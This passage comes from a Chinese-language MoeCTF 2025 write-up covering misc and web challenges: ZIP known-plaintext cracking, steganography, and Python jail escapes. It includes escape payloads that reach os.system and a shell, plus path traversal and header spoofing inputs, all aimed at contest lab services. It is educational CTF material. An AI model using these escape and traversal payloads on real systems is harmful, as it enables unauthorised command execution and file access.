zlib.decompress(zlib_data)</span><br><span class="line">        return decompressed</span><br><span class="line">    except zlib.error as e:</span><br><span class="line">        print(f&quot;解压失败: &#123;e&#125;&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"># 输入数据</span><br><span class="line">idat_hex = &quot;&quot;&quot;</span><br><span class="line">6A 71 EB 4B 00 00 00 26 49 44 41 54 78 9C CB CD</span><br><span class="line">4F 4D 2E 49 AB CE 30 74 49 71 CD 8B 0F 30 89 CC</span><br><span class="line">F1 4F 74 89 F7 F4 D3 F5 4C 31 09 A9 05 00 A8 D0</span><br><span class="line">0A 5F 18 75 55 B6 00 00 00 00 49 45 4E 44 AE 42</span><br><span class="line">60 82</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># 解压并输出</span><br><span class="line">result = decompress_idat_raw(idat_hex)</span><br><span class="line">if result:</span><br><span class="line">    print(&quot;解压成功！原始数据：&quot;)</span><br><span class="line">    print(result.hex(&quot; &quot;))  # 以十六进制打印</span><br><span class="line">    print(&quot;\nASCII预览：&quot;)</span><br><span class="line">    print(result.decode(&quot;latin-1&quot;, errors=&quot;replace&quot;))  # 尝试ASCII解码</span><br><span class="line">else:</span><br><span class="line">    print(&quot;解压失败！&quot;)</span><br></pre></td></tr></table></figure>

<p>成功获取flag。</p>
<h3 id="12-万里挑一"><a href="#12-万里挑一" class="headerlink" title="12.万里挑一"></a>12.万里挑一</h3><p>解压文件夹，发现有一万个密码，使用脚本获取密码生成字典，然后爆破，得到正确密码a296a5ec1385f394e8cb，打开lock.zip</p>
<p>发现里面有一个flag.zip,查看发现是Store的压缩方式，使用ZipCrypto压缩方法，再结合其中的明文.exe,可以推测为是明文攻击。具体教程可以查看<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/255145.html)%EF%BC%8CEXE%E6%96%87%E4%BB%B6%E9%BB%98%E8%AE%A4%E5%8A%A0%E5%AF%86%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E4%B8%8D%E5%A4%AA%E4%BC%9A%E4%BB%A5store%E6%96%B9%E5%BC%8F%E8%A2%AB%E5%8A%A0%E5%AF%86%EF%BC%8C%E4%BD%86%E5%AE%83%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%B8%AD%E7%9A%84%E7%9A%84%E6%98%8E%E6%96%87%E5%8F%8A%E5%85%B6%E6%98%8E%E6%98%BE%EF%BC%8C%E9%95%BF%E5%BA%A6%E8%B6%B3%E5%A4%9F%E3%80%82%E5%A6%82%E6%9E%9C%E5%8A%A0%E5%AF%86ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%87%BA%E7%8E%B0%E4%BB%A5store%E7%AE%97%E6%B3%95%E5%AD%98%E5%82%A8%E7%9A%84EXE%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BE%88%E5%AE%B9%E6%98%93%E8%BF%9B%E8%A1%8C%E7%A0%B4%E8%A7%A3%E3%80%82">https://www.freebuf.com/articles/network/255145.html)，EXE文件默认加密情况下，不太会以store方式被加密，但它文件格式中的的明文及其明显，长度足够。如果加密ZIP压缩包出现以store算法存储的EXE格式文件，很容易进行破解。</a><br>大部分exe中都有这相同一段，且偏移固定为64。</p>
<p>使用bkcrack爆破出密钥。</p>
<p>然后用密钥解密就可以了，获得flag。</p>
<h3 id="13-Encrypted-volume"><a href="#13-Encrypted-volume" class="headerlink" title="13.Encrypted volume"></a>13.Encrypted volume</h3><p>使用foremost文件分离得到一张图片，打开是二维码，扫描获得挂载密钥*:@(s&lt;”A3F:89x541Ux[&lt;*，然后使用Veracrypt挂载,得到里面的brainfuck文件，使用网站<a target="_blank" rel="noopener" href="https://tool.bugku.com/brainfuck/%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%BE%97%E5%88%B0flag">https://tool.bugku.com/brainfuck/在线解密，得到flag</a>   moectf{nOW_YoU-h4V3_UNlocKED-VOlumE}</p>
<h3 id="14-哈基米难没露躲"><a href="#14-哈基米难没露躲" class="headerlink" title="14.哈基米难没露躲"></a>14.哈基米难没露躲</h3><p>下载附件，在压缩包注释中看到解密网址，解密得到fake flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‌‌‌‌‍‬﻿‍‌‌‌‌‍‬﻿﻿fakeflag‌‌‌‌‍‬‍‍‌‌‌‌‍‬‌﻿‌‌‌‌‍﻿‍‌‌‌‌‌‍‬‍‬&#123;‌‌‌‌‍﻿‬﻿you‌‌‌‌‌﻿‌‍‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‬‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‍‌_can_‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‌﻿‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‌try‌‌‌‌‌﻿‌‍‌‌‌‌‌‬﻿‍‌‌‌‌‍‬‌‍‌‌‌‌‌﻿‌‍_‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‌‌‌‌‌‌‬﻿‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‍‍‌‌‌‌‍‬‌‬‌‌‌‌‍‬‍‍searching‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‌﻿_text‌‌‌‌‌﻿‍‬_‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌‬‌‌‌‌‍﻿﻿‍Steganography&#125;</span><br></pre></td></tr></table></figure>

<p>显然存在隐写，使用零宽隐写解密得到真实flag。</p>
<h3 id="15-2048-master"><a href="#15-2048-master" class="headerlink" title="15.2048_master"></a>15.2048_master</h3><p>打开以后，发现生成了data文件。提示合成出16384可获得flag，打开data文件发现是矩阵，以2的次方来存数，修改即可。</p>
<h3 id="16-Pyjail-0"><a href="#16-Pyjail-0" class="headerlink" title="16.Pyjail 0"></a>16.Pyjail 0</h3><p>（为什么这会放在misc里面）</p>
<p>nc连接，输入反转字符后可以查文件，由题目提示，查找&#x2F;proc&#x2F;self&#x2F;environ,得到flag。</p>
<h3 id="17-Pyjail-1"><a href="#17-Pyjail-1" class="headerlink" title="17.Pyjail 1"></a>17.Pyjail 1</h3><p>输入breakpoint()进入调试，在输入<code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>即可执行系统命令，输入tac &#x2F;tmp&#x2F;flag.txt得到flag,终端交互如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Please enter the reverse of &#x27;A9OXRP42&#x27; to continue: 24PRX09A</span><br><span class="line">Error! Please try again.</span><br><span class="line">Please enter the reverse of &#x27;LJ6L035O&#x27; to continue: O530L6JL</span><br><span class="line">Give me your code: breakpoint()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="line">(Pdb) __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br><span class="line">ls /tmp</span><br><span class="line">flag.txt</span><br><span class="line">cat /tmp/flag.txt</span><br><span class="line">moectf&#123;a1573a86-1852-2c5b-7382-4c061ec28a77&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-Pyjail-2"><a href="#18-Pyjail-2" class="headerlink" title="18.Pyjail 2"></a>18.Pyjail 2</h3><p>同 pyjail 1。</p>
<h3 id="19-Pyjail-3"><a href="#19-Pyjail-3" class="headerlink" title="19.Pyjail 3"></a>19.Pyjail 3</h3><p>输入<code>[].__class__.__base__.__subclasses__()</code>得到所有的子类。</p>
<p>使用下述脚本获取catch_warnings的序列号。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"># 从你提供的子类列表中查找 catch_warnings</span><br><span class="line">subclasses_list = [</span><br><span class="line">    &#x27;&lt;class type&gt;&#x27;, &#x27;&lt;class async_generator&gt;&#x27;, &#x27;&lt;class bytearray_iterator&gt;&#x27;, &#x27;&lt;class bytearray&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class bytes_iterator&gt;&#x27;, &#x27;&lt;class bytes&gt;&#x27;, &#x27;&lt;class builtin_function_or_method&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class callable_iterator&gt;&#x27;, &#x27;&lt;class PyCapsule&gt;&#x27;, &#x27;&lt;class cell&gt;&#x27;, &#x27;&lt;class classmethod_descriptor&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class classmethod&gt;&#x27;, &#x27;&lt;class code&gt;&#x27;, &#x27;&lt;class complex&gt;&#x27;, &#x27;&lt;class _contextvars.Token&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _contextvars.ContextVar&gt;&#x27;, &#x27;&lt;class _contextvars.Context&gt;&#x27;, &#x27;&lt;class coroutine&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class dict_items&gt;&#x27;, &#x27;&lt;class dict_itemiterator&gt;&#x27;, &#x27;&lt;class dict_keyiterator&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class dict_valueiterator&gt;&#x27;, &#x27;&lt;class dict_keys&gt;&#x27;, &#x27;&lt;class mappingproxy&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class dict_reverseitemiterator&gt;&#x27;, &#x27;&lt;class dict_reversekeyiterator&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class dict_reversevalueiterator&gt;&#x27;, &#x27;&lt;class dict_values&gt;&#x27;, &#x27;&lt;class dict&gt;&#x27;, &#x27;&lt;class ellipsis&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class enumerate&gt;&#x27;, &#x27;&lt;class filter&gt;&#x27;, &#x27;&lt;class float&gt;&#x27;, &#x27;&lt;class frame&gt;&#x27;, &#x27;&lt;class frozenset&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class function&gt;&#x27;, &#x27;&lt;class generator&gt;&#x27;, &#x27;&lt;class getset_descriptor&gt;&#x27;, &#x27;&lt;class instancemethod&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class list_iterator&gt;&#x27;, &#x27;&lt;class list_reverseiterator&gt;&#x27;, &#x27;&lt;class list&gt;&#x27;, &#x27;&lt;class longrange_iterator&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class int&gt;&#x27;, &#x27;&lt;class map&gt;&#x27;, &#x27;&lt;class member_descriptor&gt;&#x27;, &#x27;&lt;class memoryview&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class method_descriptor&gt;&#x27;, &#x27;&lt;class method&gt;&#x27;, &#x27;&lt;class moduledef&gt;&#x27;, &#x27;&lt;class module&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class odict_iterator&gt;&#x27;, &#x27;&lt;class pickle.PickleBuffer&gt;&#x27;, &#x27;&lt;class property&gt;&#x27;, &#x27;&lt;class range_iterator&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class range&gt;&#x27;, &#x27;&lt;class reversed&gt;&#x27;, &#x27;&lt;class symtable entry&gt;&#x27;, &#x27;&lt;class iterator&gt;&#x27;, &#x27;&lt;class set_iterator&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class set&gt;&#x27;, &#x27;&lt;class slice&gt;&#x27;, &#x27;&lt;class staticmethod&gt;&#x27;, &#x27;&lt;class stderrprinter&gt;&#x27;, &#x27;&lt;class super&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class traceback&gt;&#x27;, &#x27;&lt;class tuple_iterator&gt;&#x27;, &#x27;&lt;class tuple&gt;&#x27;, &#x27;&lt;class str_iterator&gt;&#x27;, &#x27;&lt;class str&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class wrapper_descriptor&gt;&#x27;, &#x27;&lt;class zip&gt;&#x27;, &#x27;&lt;class types.GenericAlias&gt;&#x27;, &#x27;&lt;class anext_awaitable&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class async_generator_asend&gt;&#x27;, &#x27;&lt;class async_generator_athrow&gt;&#x27;, &#x27;&lt;class async_generator_wrapped_value&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _buffer_wrapper&gt;&#x27;, &#x27;&lt;class Token.MISSING&gt;&#x27;, &#x27;&lt;class coroutine_wrapper&gt;&#x27;, &#x27;&lt;class generic_alias_iterator&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class items&gt;&#x27;, &#x27;&lt;class keys&gt;&#x27;, &#x27;&lt;class values&gt;&#x27;, &#x27;&lt;class hamt_array_node&gt;&#x27;, &#x27;&lt;class hamt_bitmap_node&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class hamt_collision_node&gt;&#x27;, &#x27;&lt;class hamt&gt;&#x27;, &#x27;&lt;class sys.legacy_event_handler&gt;&#x27;, &#x27;&lt;class InterpreterID&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class line_iterator&gt;&#x27;, &#x27;&lt;class managedbuffer&gt;&#x27;, &#x27;&lt;class memory_iterator&gt;&#x27;, &#x27;&lt;class method-wrapper&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class types.SimpleNamespace&gt;&#x27;, &#x27;&lt;class NoneType&gt;&#x27;, &#x27;&lt;class NotImplementedType&gt;&#x27;, &#x27;&lt;class positions_iterator&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class str_ascii_iterator&gt;&#x27;, &#x27;&lt;class types.UnionType&gt;&#x27;, &#x27;&lt;class weakref.CallableProxyType&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class weakref.ProxyType&gt;&#x27;, &#x27;&lt;class weakref.ReferenceType&gt;&#x27;, &#x27;&lt;class typing.TypeAliasType&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class typing.Generic&gt;&#x27;, &#x27;&lt;class typing.TypeVar&gt;&#x27;, &#x27;&lt;class typing.TypeVarTuple&gt;&#x27;, &#x27;&lt;class typing.ParamSpec&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class typing.ParamSpecArgs&gt;&#x27;, &#x27;&lt;class typing.ParamSpecKwargs&gt;&#x27;, &#x27;&lt;class EncodingMap&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class fieldnameiterator&gt;&#x27;, &#x27;&lt;class formatteriterator&gt;&#x27;, &#x27;&lt;class BaseException&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _frozen_importlib._WeakValueDictionary&gt;&#x27;, &#x27;&lt;class _frozen_importlib._BlockingOnManager&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _frozen_importlib._ModuleLock&gt;&#x27;, &#x27;&lt;class _frozen_importlib._DummyModuleLock&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _frozen_importlib._ModuleLockManager&gt;&#x27;, &#x27;&lt;class _frozen_importlib.ModuleSpec&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _frozen_importlib.BuiltinImporter&gt;&#x27;, &#x27;&lt;class _frozen_importlib.FrozenImporter&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _frozen_importlib._ImportLockContext&gt;&#x27;, &#x27;&lt;class _thread.lock&gt;&#x27;, &#x27;&lt;class _thread.RLock&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _thread._localdummy&gt;&#x27;, &#x27;&lt;class _thread._local&gt;&#x27;, &#x27;&lt;class _io.IncrementalNewlineDecoder&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _io._BytesIOBuffer&gt;&#x27;, &#x27;&lt;class _io._IOBase&gt;&#x27;, &#x27;&lt;class posix.ScandirIterator&gt;&#x27;, &#x27;&lt;class posix.DirEntry&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _frozen_importlib_external.WindowsRegistryFinder&gt;&#x27;, &#x27;&lt;class _frozen_importlib_external._LoaderBasics&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _frozen_importlib_external.FileLoader&gt;&#x27;, &#x27;&lt;class _frozen_importlib_external._NamespacePath&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _frozen_importlib_external.NamespaceLoader&gt;&#x27;, &#x27;&lt;class _frozen_importlib_external.PathFinder&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _frozen_importlib_external.FileFinder&gt;&#x27;, &#x27;&lt;class codecs.Codec&gt;&#x27;, &#x27;&lt;class codecs.IncrementalEncoder&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class codecs.IncrementalDecoder&gt;&#x27;, &#x27;&lt;class codecs.StreamReaderWriter&gt;&#x27;, &#x27;&lt;class codecs.StreamRecoder&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _abc._abc_data&gt;&#x27;, &#x27;&lt;class abc.ABC&gt;&#x27;, &#x27;&lt;class collections.abc.Hashable&gt;&#x27;, &#x27;&lt;class collections.abc.Awaitable&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class collections.abc.AsyncIterable&gt;&#x27;, &#x27;&lt;class collections.abc.Iterable&gt;&#x27;, &#x27;&lt;class collections.abc.Sized&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class collections.abc.Container&gt;&#x27;, &#x27;&lt;class collections.abc.Buffer&gt;&#x27;, &#x27;&lt;class collections.abc.Callable&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class genericpath.ALLOW_MISSING&gt;&#x27;, &#x27;&lt;class os._wrap_close&gt;&#x27;, &#x27;&lt;class _sitebuiltins.Quitter&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _sitebuiltins._Printer&gt;&#x27;, &#x27;&lt;class _sitebuiltins._Helper&gt;&#x27;, &#x27;&lt;class ast.AST&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class warnings.WarningMessage&gt;&#x27;, &#x27;&lt;class warnings.catch_warnings&gt;&#x27;, &#x27;&lt;class operator.attrgetter&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class operator.itemgetter&gt;&#x27;, &#x27;&lt;class operator.methodcaller&gt;&#x27;, &#x27;&lt;class itertools.accumulate&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class itertools.batched&gt;&#x27;, &#x27;&lt;class itertools.chain&gt;&#x27;, &#x27;&lt;class itertools.combinations&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class itertools.compress&gt;&#x27;, &#x27;&lt;class itertools.count&gt;&#x27;, &#x27;&lt;class itertools.combinations_with_replacement&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class itertools.cycle&gt;&#x27;, &#x27;&lt;class itertools.dropwhile&gt;&#x27;, &#x27;&lt;class itertools.filterfalse&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class itertools.groupby&gt;&#x27;, &#x27;&lt;class itertools._grouper&gt;&#x27;, &#x27;&lt;class itertools.islice&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class itertools.pairwise&gt;&#x27;, &#x27;&lt;class itertools.permutations&gt;&#x27;, &#x27;&lt;class itertools.product&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class itertools.repeat&gt;&#x27;, &#x27;&lt;class itertools.starmap&gt;&#x27;, &#x27;&lt;class itertools.takewhile&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class itertools._tee&gt;&#x27;, &#x27;&lt;class itertools._tee_dataobject&gt;&#x27;, &#x27;&lt;class itertools.zip_longest&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _random.Random&gt;&#x27;, &#x27;&lt;class _sha2.SHA224Type&gt;&#x27;, &#x27;&lt;class _sha2.SHA256Type&gt;&#x27;, &#x27;&lt;class _sha2.SHA384Type&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class _sha2.SHA512Type&gt;&#x27;, &#x27;&lt;class types.DynamicClassAttribute&gt;&#x27;, &#x27;&lt;class types._GeneratorWrapper&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class reprlib.Repr&gt;&#x27;, &#x27;&lt;class collections.deque&gt;&#x27;, &#x27;&lt;class collections._deque_iterator&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class collections._deque_reverse_iterator&gt;&#x27;, &#x27;&lt;class collections._tuplegetter&gt;&#x27;, &#x27;&lt;class collections._Link&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class functools.partial&gt;&#x27;, &#x27;&lt;class functools._lru_cache_wrapper&gt;&#x27;, &#x27;&lt;class functools.KeyWrapper&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class functools._lru_list_elem&gt;&#x27;, &#x27;&lt;class functools.partialmethod&gt;&#x27;, &#x27;&lt;class functools.singledispatchmethod&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class functools.cached_property&gt;&#x27;, &#x27;&lt;class enum.nonmember&gt;&#x27;, &#x27;&lt;class enum.member&gt;&#x27;, &#x27;&lt;class enum._not_given&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class enum._auto_null&gt;&#x27;, &#x27;&lt;class enum.auto&gt;&#x27;, &#x27;&lt;class enum._proto_member&gt;&#x27;, &#x27;&lt;enum Enum&gt;&#x27;, &#x27;&lt;class enum.verify&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class re.Pattern&gt;&#x27;, &#x27;&lt;class re.Match&gt;&#x27;, &#x27;&lt;class _sre.SRE_Scanner&gt;&#x27;, &#x27;&lt;class _sre.SRE_Template&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class re._parser.State&gt;&#x27;, &#x27;&lt;class re._parser.SubPattern&gt;&#x27;, &#x27;&lt;class re._parser.Tokenizer&gt;&#x27;, &#x27;&lt;class re.Scanner&gt;&#x27;,</span><br><span class="line">    &#x27;&lt;class string.Template&gt;&#x27;, &#x27;&lt;class string.Formatter&gt;&#x27;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 查找 catch_warnings 的索引</span><br><span class="line">for i, cls_str in enumerate(subclasses_list):</span><br><span class="line">    if &#x27;catch_warnings&#x27; in cls_str:</span><br><span class="line">        print(f&quot;catch_warnings 索引: &#123;i&#125;&quot;)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<p>最终payload:<code> [].__class__.__base__.__subclasses__()[脚本得出的序列号]()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;cat /tmp/flag.txt&#39;)</code></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="01-第一章-神秘的手镯"><a href="#01-第一章-神秘的手镯" class="headerlink" title="01 第一章 神秘的手镯"></a>01 第一章 神秘的手镯</h3><p>只需要输入万字密文就可以获得flag，但是发现无法复制黏贴。F12查看代码，在js代码中直接获得flag:<em>moectf{f_i2_1s_Your_g00d_fri3nd!!}</em></p>
<h3 id="02-第二章-初识金曦玄轨"><a href="#02-第二章-初识金曦玄轨" class="headerlink" title="02 第二章 初识金曦玄轨"></a>02 第二章 初识金曦玄轨</h3><p>阅读页面源代码，得到提示，访问&#x2F;golden_trail，用bp抓包，成功在响应包中看到flag：<em>moectf{0bs3rv3_Th3_Gold3n_traiL}</em></p>
<h3 id="03-第三章-问剑石！篡天改命！"><a href="#03-第三章-问剑石！篡天改命！" class="headerlink" title="03 第三章 问剑石！篡天改命！"></a>03 第三章 问剑石！篡天改命！</h3><p>查看题目，发现需要修改请求包，bp抓包，然后修改如下：<img src="https://lunereal.1kal0vic.top/images/img/moe2025/6.png" alt="6" loading="lazy"></p>
<p>得到flag。</p>
<h3 id="04-第四章-金曦破禁与七绝傀儡阵"><a href="#04-第四章-金曦破禁与七绝傀儡阵" class="headerlink" title="04 第四章 金曦破禁与七绝傀儡阵"></a>04 第四章 金曦破禁与七绝傀儡阵</h3><p>没啥好说的，一步步照做就是，</p>
<p>第一关添加GET参数，获取碎片：bW9lY3Rme0Mw</p>
<p>第二个添加POST参数，获取碎片：bjZyNDd1MTQ3</p>
<p>第三关添加请求头<code>X-Forwarded-For:127.0.0.1</code>，获得碎片：MTBuNV95MHVy</p>
<p>第四个修改UA请求头为<code>User-Agent:moe browser</code>，获得碎片：X2g3N1BfbDN2</p>
<p>第五关添加cookie：user&#x3D;xt,获得碎片：M2xfMTVfcjM0</p>
<p>第六关将Referer内容改为<code>http://panshi/entry</code>,获得碎片：bGx5X2gxOWgh</p>
<p>第七关，使用以下脚本发送put请求，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:57000/void_rebirth&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;127.0.0.1:57000&quot;,</span><br><span class="line">    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,</span><br><span class="line">    &quot;sec-ch-ua&quot;: &#x27;&quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;&#x27;,</span><br><span class="line">    &quot;sec-ch-ua-mobile&quot;: &quot;?0&quot;,</span><br><span class="line">    &quot;sec-ch-ua-platform&quot;: &#x27;&quot;Windows&quot;&#x27;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Mode&quot;: &quot;navigate&quot;,</span><br><span class="line">    &quot;Sec-Fetch-User&quot;: &quot;?1&quot;,</span><br><span class="line">    &quot;Sec-Fetch-Dest&quot;: &quot;document&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://127.0.0.1:57000/pathfinder&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;keep-alive&quot;</span><br><span class="line">&#125;</span><br><span class="line">data = &quot;新生！&quot;</span><br><span class="line"></span><br><span class="line">response = requests.put(url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line">print(response.status_code)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p>获得最后一块碎片，然后连在一起base64解密即可获得flag。</p>
<h3 id="05-第五章-打上门来！"><a href="#05-第五章-打上门来！" class="headerlink" title="05 第五章 打上门来！"></a>05 第五章 打上门来！</h3><p>由题目可知考的是目录传输，输入<code>../../flag</code>,得到flag：moectf{41L_lnPUt-IS_maliCiOus6e6d93a3}</p>
